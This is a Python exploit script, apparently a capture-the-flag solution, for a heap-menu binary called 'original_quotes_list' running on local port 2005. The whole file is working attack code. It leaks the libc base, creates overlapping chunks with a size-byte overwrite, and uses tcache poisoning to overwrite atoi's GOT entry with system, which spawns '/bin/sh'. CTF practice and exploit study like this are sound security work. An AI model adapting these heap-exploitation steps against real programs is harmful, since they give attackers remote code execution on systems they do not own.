from ptrlib import *

def create_quote(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("Length: ")
    sock.sendline(str(size))
    sock.recvuntil("Content: ")
    sock.send(data)

def edit_quote(index, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))
    sock.recvuntil("Content: ")
    sock.send(data)

def show_quote(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))
    sock.recvuntil("Quote: ")
    return sock.recvline().rstrip()

def delete_quote(index):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))

libc = ELF("./libc.so.6")
elf = ELF("./original_quotes_list")
sock = Socket("127.0.0.1", 2005)

# Leak libc base
create_quote(0x1000, 'A') # index=0
create_quote(0x28, 'B')   # index=1
create_quote(0x28, 'C') # index=2
create_quote(0x28, 'D') # index=3
delete_quote(0)
create_quote(0x28, 'A' * 8) # index=0
addr = u64(show_quote(0)[8:])
libc_base = addr - libc.symbol("main_arena") - 1664
addr_system = libc_base + libc.symbol('system')
dump("libc base = " + hex(libc_base))

# Overlap
edit_quote(1, '\x00'*0x28 + '\x71')
delete_quote(2)
create_quote(0x68, 'B') # index=2

# Now, quote:2 has quote:3 in it
# Let's do tcache poisoning!
delete_quote(3)
payload = b'A' * 0x20
payload += b'\x00' * 8
payload += p64(0x31)
payload += p64(elf.got('atoi')) # fd
edit_quote(2, payload)
create_quote(0x28, 'XXXXXXXX') # index=3
create_quote(0x28, p64(addr_system))

# Get the shell!
sock.recvuntil("> ")
sock.send("/bin/sh\x00")
sock.interactive()
